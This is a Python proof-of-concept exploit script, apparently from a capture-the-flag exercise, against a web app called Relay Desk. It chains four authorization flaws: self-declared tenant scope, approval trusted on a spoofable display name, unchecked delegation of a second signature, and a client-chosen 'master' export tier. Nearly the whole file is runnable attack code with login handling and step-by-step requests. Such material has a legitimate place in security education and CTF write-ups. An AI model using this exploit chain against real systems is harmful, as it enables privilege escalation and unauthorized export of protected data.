#!/usr/bin/env python3
"""Relay Desk (Kestrel Signals) - proof of concept.

Summary: three client-editable profile fields are trusted at three
privilege boundaries; chained they yield a master-tier export.

Usage: relaydesk.py [BASE_URL] [ROTATION_REF]
Env:   RELAYDESK_USER (default a.reyes), RELAYDESK_PASSWORD (or prompted),
       RELAYDESK_COOKIE (optional rdsession cookie; skips login)

The CTF instance is retired; this PoC documents the exploit path.
"""

import getpass
import os
import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
ROTATION_REF = sys.argv[2] if len(sys.argv) > 2 else "rr_S0wtMDE6MTA.96cc36ad984a53de"

USER = os.environ.get("RELAYDESK_USER", "a.reyes")
TARGET_SCOPE = "KL-01"                    # Theatre Relay Authority
SPOOF_NAME = "Maj. R. Castellan"          # authorized approver named on the rotation
DELEGATE_ID = "usr_okonkwo"               # account the second signature is delegated to


def login(session):
    cookie = os.environ.get("RELAYDESK_COOKIE")
    if cookie:
        session.cookies.set("rdsession", cookie)
        return
    password = os.environ.get("RELAYDESK_PASSWORD") or getpass.getpass(f"Password for {USER}: ")
    # Login endpoint shape is not documented in the writeup; if this fails,
    # capture the rdsession cookie from a browser and set RELAYDESK_COOKIE.
    resp = session.post(f"{BASE}/api/login",
                        json={"username": USER, "password": password},
                        timeout=10)
    resp.raise_for_status()


def refresh(session):
    resp = session.post(f"{BASE}/api/profile/refresh", timeout=10)
    resp.raise_for_status()
    return resp.json()


def patch_profile(session, **fields):
    resp = session.patch(f"{BASE}/api/profile", json=fields, timeout=10)
    resp.raise_for_status()
    return resp.json()


def main():
    session = requests.Session()
    login(session)

    # 1. Tenant scope hijack: duty_assignment is self-declared and never checked.
    patch_profile(session, duty_assignment=TARGET_SCOPE)
    state = refresh(session)
    print(f"[scope] {state}")

    # 2. Approval authorization trusts display_name, not account id or role.
    patch_profile(session, display_name=SPOOF_NAME)
    refresh(session)
    resp = session.post(f"{BASE}/api/rotations/{ROTATION_REF}/approve",
                        json={}, timeout=10)
    resp.raise_for_status()
    print(f"[approve] {resp.json()}")

    # 3. Delegated second signature: caller needs no delegation rights.
    resp = session.post(f"{BASE}/api/rotations/{ROTATION_REF}/delegate-approval",
                        json={"delegate_id": DELEGATE_ID}, timeout=10)
    resp.raise_for_status()
    print(f"[delegate] {resp.json()}")

    # 4. Export tier is taken from the request, not from rotation.authorized_tier.
    resp = session.post(f"{BASE}/api/rotations/{ROTATION_REF}/export",
                        json={"tier": "master"}, timeout=10)
    resp.raise_for_status()
    print(f"[export] {resp.json()}")


if __name__ == "__main__":
    main()
